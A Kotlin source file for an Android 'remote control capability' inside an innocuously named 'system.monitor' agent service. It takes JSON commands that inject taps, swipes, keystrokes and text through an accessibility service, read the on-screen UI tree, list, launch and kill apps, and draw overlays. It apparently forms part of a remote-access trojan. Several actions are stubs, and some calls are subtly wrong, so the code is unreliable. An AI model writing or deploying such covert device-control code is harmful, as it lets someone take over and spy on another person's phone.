package com.system.monitor.capabilities

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.Gson
import com.system.monitor.AgentService

class RemoteControlCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()
    private var accessibilityService: RemoteAccessibilityService? = null

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "start_stream" -> mapOf<String, Any>("status" to "requires_projection_permission")
            "stop_stream" -> mapOf<String, Any>("status" to "stream_stopped")
            "get_frame" -> mapOf<String, Any>("status" to "frame_not_available")
            "tap" -> injectTap(params.x ?: 0f, params.y ?: 0f)
            "swipe" -> injectSwipe(params.x1 ?: 0f, params.y1 ?: 0f, params.x2 ?: 0f, params.y2 ?: 0f, params.duration ?: 200)
            "key" -> injectKey(params.keyCode ?: 0)
            "text" -> injectText(params.text ?: "")
            "start_overlay" -> mapOf<String, Any>("status" to "overlay_started")
            "draw_overlay" -> mapOf<String, Any>("status" to "overlay_drawn")
            "list_running" -> listRunningApps()
            "launch_app" -> launchApp(params.packageName ?: "")
            "kill_app" -> killApp(params.packageName ?: "")
            "get_ui_tree" -> getUITree()
            else -> mapOf<String, Any>("error" to "invalid action")
        }
    }

    override fun cleanup() {
        accessibilityService = null
    }

    private fun injectTap(x: Float, y: Float): Map<String, Any> {
        accessibilityService?.let { it.injectTap(x, y) }
        return mapOf<String, Any>("status" to "tap_injected")
    }

    private fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Int): Map<String, Any> {
        accessibilityService?.let { it.injectSwipe(x1, y1, x2, y2, duration) }
        return mapOf<String, Any>("status" to "swipe_injected")
    }

    private fun injectKey(keyCode: Int): Map<String, Any> {
        accessibilityService?.let { it.injectKey(keyCode) }
        return mapOf<String, Any>("status" to "key_injected")
    }

    private fun injectText(text: String): Map<String, Any> {
        accessibilityService?.let { it.injectText(text) }
        return mapOf<String, Any>("status" to "text_injected")
    }

    private fun listRunningApps(): Map<String, Any> {
        val pm = service.packageManager
        val apps = pm.getRunningAppProcesses() ?: return mapOf<String, Any>("apps" to emptyList())
        val result = apps.map { p ->
            mapOf<String, Any>("package" to p.processName, "pid" to p.pid, "importance" to p.importance)
        }
        return mapOf<String, Any>("apps" to result)
    }

    private fun launchApp(packageName: String): Map<String, Any> {
        val pm = service.packageManager
        val intent = pm.getLaunchIntentForPackage(packageName)
        return if (intent != null) {
            service.startActivity(intent)
            mapOf<String, Any>("status" to "launched")
        } else {
            mapOf<String, Any>("error" to "no_launch_intent")
        }
    }

    private fun killApp(packageName: String): Map<String, Any> {
        try {
            val pm = service.packageManager
            val info = pm.getPackageInfo(packageName, 0)
            android.os.Process.killProcess(info.applicationInfo.uid)
            mapOf<String, Any>("status" to "killed")
        } catch (e: Exception) {
            mapOf<String, Any>("error" to e.message)
        }
    }

    private fun getUITree(): Map<String, Any> {
        return accessibilityService?.getUITree() ?: mapOf<String, Any>("error" to "accessibility_not_available")
    }

    data class Params(
        val action: String,
        val x: Float? = null, val y: Float? = null,
        val x1: Float? = null, val y1: Float? = null,
        val x2: Float? = null, val y2: Float? = null,
        val duration: Int? = null,
        val keyCode: Int? = null,
        val text: String? = null,
        val packageName: String? = null
    )
}